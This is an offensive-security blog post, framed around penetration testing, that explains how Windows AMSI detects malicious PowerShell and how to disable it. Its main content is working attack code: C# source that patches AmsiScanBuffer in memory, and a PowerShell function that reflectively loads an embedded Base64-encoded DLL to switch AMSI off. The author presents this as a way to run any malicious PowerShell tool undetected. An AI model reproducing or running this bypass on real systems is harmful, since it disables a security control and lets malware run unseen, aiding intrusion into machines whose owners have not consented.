---
layout: post
title:  "How to bypass AMSI and execute ANY malicious Powershell code"
date:   2018-10-28 17:53:01 -0300
categories: research
---

Hello again. In my previous posts I detailed how to manually get SYSTEM shell from Local Administrators users. That's interesting but very late game during a penetration assessment as it is presumed that you already owned the target machine. 

This post will be more useful for early game, as AMSI (Anti Malware Scan Interface) can be a trouble to get a shell, or to execute post-exploitation tools while you still do not have an admin shell.

# What is AMSI?

AMSI stands for "ANTI MALWARE SCAN INTERFACE"; 

As it's name suggests, it's job is to scan, detect and block anything that does bad stuff.

 Still doesn't know what this is? Check this screenshot:

![Screenshot](/assets/amsi_01.JPG)

Obviously if you are experienced with penetration testing in Windows environments, you had such error with almost all public known scripts that are used like some in Nishang, Empire, PowerSploit and other awesome PowerShell scripts.

## How does AMSI works?

AMSI uses "string-based" detection measures to determine if a PowerShell code is malicious or not. 

Check this example:

![Screenshot](/assets/amsi_02.JPG)

Yes, the word "amsiutils" is banned. If have this word in your name, my friend, you are a malicious person for AMSI.

## How to bypass string detection?

Everyone knows that string detection is very easy to bypass, just don't use your banned string literally. Use encoding or split it in chunks and reassemble to get around this.

Here are three ways of executing the "banned" code and not get blocked:

![Screenshot](/assets/amsi_03.JPG)

Simply by splitting the word in half is enough to fool this detection scheme. We see this a lot in obfuscation. But in most of the cases, this method can fail.

![Screenshot](/assets/amsi_04.JPG)

In some cases, simply by decoding a Base64 banned code is enough to get around it.

![Screenshot](/assets/amsi_05.JPG)

And of course, you could use XOR to trick amsi and decode your string back to memory during runtime. This would be the more effective one, as it would need a higher abstraction to detect it.

All this techniques are to "GET AROUND" string detection, but we don't want that. We want to execute the scripts in original state, the state where they are blocked by AMSI. 

## AMSI bypass by memory patching

This is the true bypass. Actually we do not "bypass" in the strict meaning of the word, we actually DISABLE it.

AMSI has several functions that are executed before any PowerShell code is run (from Powershell v3.0 onwards), so to bypass AMSI completely and execute any PowerShell malware, we need to memory patch them to COMPLETELY DISABLE it.

The best technique I have found in the internet is in this [Link](https://www.cyberark.com/threat-research-blog/amsi-bypass-redux) and it works in most recent version of Windows!

*I wont enter in details about memory patching, you can get these details in above link*

Instead, we will weaponize this technique and apply it to a PowerShell script, so we can use it in our real life engagements!

We will compile a C# DLL with code that will apply the above mentioned technique and then we will load and execute this code in a PowerShell session, disabling AMSI completely!

```c#
using System;
using System.Runtime.InteropServices;

namespace Bypass
{
    public class AMSI
    {
        [DllImport("kernel32")]
        public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
        [DllImport("kernel32")]
        public static extern IntPtr LoadLibrary(string name);
        [DllImport("kernel32")]
        public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

        [DllImport("Kernel32.dll", EntryPoint = "RtlMoveMemory", SetLastError = false)]
        static extern void MoveMemory(IntPtr dest, IntPtr src, int size);


        public static int Disable()
        {
            IntPtr TargetDLL = LoadLibrary("amsi.dll");
            if (TargetDLL == IntPtr.Zero)
            {
                Console.WriteLine("ERROR: Could not retrieve amsi.dll pointer.");
                return 1;
            }

            IntPtr AmsiScanBufferPtr = GetProcAddress(TargetDLL, "AmsiScanBuffer");
            if (AmsiScanBufferPtr == IntPtr.Zero)
            {
                Console.WriteLine("ERROR: Could not retrieve AmsiScanBuffer function pointer");
                return 1;
            }

            UIntPtr dwSize = (UIntPtr)5;
            uint Zero = 0;
            if (!VirtualProtect(AmsiScanBufferPtr, dwSize, 0x40, out Zero))
            {
                Console.WriteLine("ERROR: Could not change AmsiScanBuffer memory permissions!");
                return 1;
            }

            /*
             * This is a new technique, and is still working.
             * Source: https://www.cyberark.com/threat-research-blog/amsi-bypass-redux/
             */
            Byte[] Patch = { 0x31, 0xff, 0x90 };
            IntPtr unmanagedPointer = Marshal.AllocHGlobal(3);
            Marshal.Copy(Patch, 0, unmanagedPointer, 3);
            MoveMemory(AmsiScanBufferPtr + 0x001b, unmanagedPointer, 3);

            Console.WriteLine("AmsiScanBuffer patch has been applied.");
            return 0;
        }
    }
}
```

Now, with possession of a DLL of the above code, use it like this:

![Screenshot](/assets/amsi_06.JPG)

See that we are able to use the banned word freely. **From this point onwards, THERE IS NO AMSI. We are free to load ANY powershell script, malicious or not.** By combining this type of attack with your malicious tools you will 100% success against AMSI.

## Weaponinzing with PowerShell

Of course, in a Penetration Test we must have tools to apply such techniques automatically. Again, as we used .NET framework through C#, we can create a Posh script that reflects our DLL in-memory during runtime, without the need to touch the disk with our DLL.

Here is my PowerShell script to disable AMSI:
```powershell
function Bypass-AMSI
{
    if(-not ([System.Management.Automation.PSTypeName]"Bypass.AMSI").Type) {
        [Reflection.Assembly]::Load([Convert]::FromBase64String("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N0RBQ0VEAEJ5cGFzc0FNU0kAbXNjb3JsaWIAc3JjAERpc2FibGUAUnVudGltZUZpZWxkSGFuZGxlAENvbnNvbGUAaE1vZHVsZQBwcm9jTmFtZQBuYW1lAFdyaXRlTGluZQBWYWx1ZVR5cGUAQ29tcGlsZXJHZW5lcmF0ZWRBdHRyaWJ1dGUAR3VpZEF0dHJpYnV0ZQBEZWJ1Z2dhYmxlQXR0cmlidXRlAENvbVZpc2libGVBdHRyaWJ1dGUAQXNzZW1ibHlUaXRsZUF0dHJpYnV0ZQBBc3NlbWJseVRyYWRlbWFya0F0dHJpYnV0ZQBUYXJnZXRGcmFtZXdvcmtBdHRyaWJ1dGUAQXNzZW1ibHlGaWxlVmVyc2lvbkF0dHJpYnV0ZQBBc3NlbWJseUNvbmZpZ3VyYXRpb25BdHRyaWJ1dGUAQXNzZW1ibHlEZXNjcmlwdGlvbkF0dHJpYnV0ZQBDb21waWxhdGlvblJlbGF4YXRpb25zQXR0cmlidXRlAEFzc2VtYmx5UHJvZHVjdEF0dHJpYnV0ZQBBc3NlbWJseUNvcHlyaWdodEF0dHJpYnV0ZQBBc3NlbWJseUNvbXBhbnlBdHRyaWJ1dGUAUnVudGltZUNvbXBhdGliaWxpdHlBdHRyaWJ1dGUAQnl0ZQBkd1NpemUAc2l6ZQBTeXN0ZW0uUnVudGltZS5WZXJzaW9uaW5nAEFsbG9jSEdsb2JhbABNYXJzaGFsAEtlcm5lbDMyLmRsbABCeXBhc3NBTVNJLmRsbABTeXN0ZW0AU3lzdGVtLlJlZmxlY3Rpb24Ab3BfQWRkaXRpb24AWmVybwAuY3RvcgBVSW50UHRyAFN5c3RlbS5EaWFnbm9zdGljcwBTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMAU3lzdGVtLlJ1bnRpbWUuQ29tcGlsZXJTZXJ2aWNlcwBEZWJ1Z2dpbmdNb2RlcwBSdW50aW1lSGVscGVycwBCeXBhc3MAR2V0UHJvY0FkZHJlc3MAbHBBZGRyZXNzAE9iamVjdABscGZsT2xkUHJvdGVjdABWaXJ0dWFsUHJvdGVjdABmbE5ld1Byb3RlY3QAb3BfRXhwbGljaXQAZGVzdABJbml0aWFsaXplQXJyYXkAQ29weQBMb2FkTGlicmFyeQBSdGxNb3ZlTWVtb3J5AG9w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")) | Out-Null
        Write-Output "DLL has been reflected";
    }
    [Bypass.AMSI]::Disable()
}
```

This will bypass string detection because it does not uses anything malicious at all. It just loads an .NET assembly to memory and execute it's code. And after executing it, you are FREE to execute real PowerShell malware!

Check my results:

![Screenshot](/assets/amsi_07.JPG)

This technique is awesome and extremly useful. You can put to use a handful of PowerShell post-exploitation scripts like Nishang, Powersploit and any other PoSH hacking tool that once was blocked by the annoying AMSI.

I hope you liked this post, all the credits for the technique goes to guys from CyberArk website, I only showed how to effectively use it in a real-life scenario from an attacker perspective.

Best regards,

zc00l.